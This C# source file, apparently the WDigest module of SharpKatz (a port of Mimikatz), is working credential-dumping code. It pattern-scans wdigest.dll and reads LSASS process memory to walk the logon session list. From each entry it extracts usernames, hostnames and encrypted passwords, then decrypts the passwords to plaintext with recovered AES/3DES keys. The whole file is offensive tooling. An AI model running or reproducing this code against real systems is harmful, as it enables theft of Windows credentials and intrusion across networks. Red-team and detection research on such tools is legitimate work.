using SharpKatz.Credential;
using SharpKatz.Crypto;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace SharpKatz
{
    class WDigest
    {
        /*
         KULL_M_PATCH_GENERIC WDigestReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-4, 36}},
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-4, 48}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_PasswdSet),	PTRN_WIN6_PasswdSet},	{0, NULL}, {-4, 48}},
};
             */

        static long max_search_size = 200000;

        // Signature used to find l_LogSessList (PTRN_WIN6_PasswdSet from Mimikatz)

        //BYTE PTRN_WIN5_PasswdSet[]	= {0x48, 0x3b, 0xda, 0x74};

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_WDIGEST_LIST_ENTRY
        {
            public IntPtr Flink; //KIWI_WDIGEST_LIST_ENTRY
            public IntPtr Blink; //KIWI_WDIGEST_LIST_ENTRY
            public int UsageCount;
            public IntPtr This;  //KIWI_WDIGEST_LIST_ENTRY
            public Natives.LUID LocallyUniqueIdentifier;

            public Natives.UNICODE_STRING UserName; // 0x30
            public Natives.UNICODE_STRING Domaine;  // 0x40
            public Natives.UNICODE_STRING Password; // 0x50
        }


        // Hunts through wdigest and extracts credentials to be decrypted
        public static unsafe int FindCredentials(IntPtr hLsass, IntPtr wdigestMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {

            KIWI_WDIGEST_LIST_ENTRY entry;
            long logSessListSigOffset, logSessListOffset;
            IntPtr logSessListAddr;
            IntPtr wdigestLocal;
            IntPtr llCurrent;
            string passDecrypted = "";

            // Load wdigest.dll locally to avoid multiple ReadProcessMemory calls into lsass
            wdigestLocal = Natives.LoadLibrary("wdigest.dll");
            if (wdigestLocal == IntPtr.Zero)
            {
                Console.WriteLine("[x] Error: Could not load wdigest.dll into local process");
                return 1;
            }
            //Console.WriteLine("[*] Loaded wdigest.dll at address {0:X}", wdigestLocal.ToInt64());

            byte[] tmpbytes = new byte[max_search_size];
            Marshal.Copy(wdigestLocal, tmpbytes, 0, (int)max_search_size);

            // Search for l_LogSessList signature within wdigest.dll and grab the offset
            logSessListSigOffset = (long)Utility.SearchPattern(tmpbytes, oshelper.logSessListSig);
            if (logSessListSigOffset == 0)
            {
                Console.WriteLine("[x] Error: Could not find l_LogSessList signature\n");
                return 1;
            }
            //Console.WriteLine("[*] l_LogSessList offset found as {0}", logSessListSigOffset);

            // Read memory offset to l_LogSessList from a "lea reg, [l_LogSessList]" asm
            IntPtr tmp_p = IntPtr.Add(wdigestMem, (int)logSessListSigOffset - 4);
            byte[] logSessListOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 4);
            logSessListOffset = BitConverter.ToInt32(logSessListOffsetBytes, 0);

            // Read pointer at address to get the true memory location of l_LogSessList
            tmp_p = IntPtr.Add(wdigestMem, (int)logSessListSigOffset + (int)logSessListOffset);
            byte[] logSessListAddrBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
            long logSessListAddrInt = BitConverter.ToInt64(logSessListAddrBytes, 0);
            logSessListAddr = new IntPtr(logSessListAddrInt);

            //Console.WriteLine("[*] l_LogSessList found at address {0:X}", logSessListAddr.ToInt64());

            // Read first entry from linked list
            byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, logSessListAddr, Convert.ToUInt64(sizeof(KIWI_WDIGEST_LIST_ENTRY)));
            IntPtr pThis = new IntPtr(BitConverter.ToInt64(entryBytes, Utility.FieldOffset<KIWI_WDIGEST_LIST_ENTRY>("This")));

            llCurrent = pThis;

            do
            {
                entryBytes = Utility.ReadFromLsass(ref hLsass, llCurrent, Convert.ToUInt64(sizeof(KIWI_WDIGEST_LIST_ENTRY)));
                entry = Utility.ReadStruct<KIWI_WDIGEST_LIST_ENTRY>(entryBytes);

                if (entry.UsageCount == 1)
                {
                    IntPtr pUsername = IntPtr.Add(llCurrent, oshelper.USERNAME_OFFSET);
                    IntPtr pHostname = IntPtr.Add(llCurrent, oshelper.HOSTNAME_OFFSET);
                    IntPtr pPassword = IntPtr.Add(llCurrent, oshelper.PASSWORD_OFFSET);

                    string username = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pUsername));
                    string hostname = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pHostname));
                    string password = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pPassword));

                    if (!string.IsNullOrEmpty(username) && username.Length > 1)
                    {
                        Natives.LUID luid = entry.LocallyUniqueIdentifier;

                        Credential.WDigest wdigestentry = new Credential.WDigest();

                        if (!string.IsNullOrEmpty(username))
                        {
                            wdigestentry.UserName = username;
                        }
                        else
                        {
                            wdigestentry.UserName = "[NULL]";
                        }

                        if (!string.IsNullOrEmpty(hostname))
                        {
                            wdigestentry.HostName = hostname;
                        }
                        else
                        {
                            wdigestentry.HostName = "[NULL]";
                        }

                        // Check if password is present
                        if (!string.IsNullOrEmpty(password) && (password.Length % 2) == 0)
                        {

                            // Decrypt password using recovered AES/3Des keys and IV
                            passDecrypted = Encoding.Unicode.GetString(BCrypt.DecryptCredentials(Encoding.Unicode.GetBytes(password), iv, aeskey, deskey));
                            if (passDecrypted.Length > 0)
                            {
                                wdigestentry.Password = passDecrypted;
                            }

                        }
                        else
                        {
                            wdigestentry.Password = "[NULL]";
                        }

                        Logon currentlogon = logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                        if (currentlogon == null)
                        {
                            currentlogon = new Logon(luid)
                            {
                                UserName = username,
                                Wdigest = wdigestentry
                            };
                            logonlist.Add(currentlogon);
                        }
                        else
                        {
                            currentlogon.Wdigest = wdigestentry;
                        }
                    }
                }

                llCurrent = entry.Flink;
            } while (llCurrent != logSessListAddr);

            return 0;
        }
    }
}
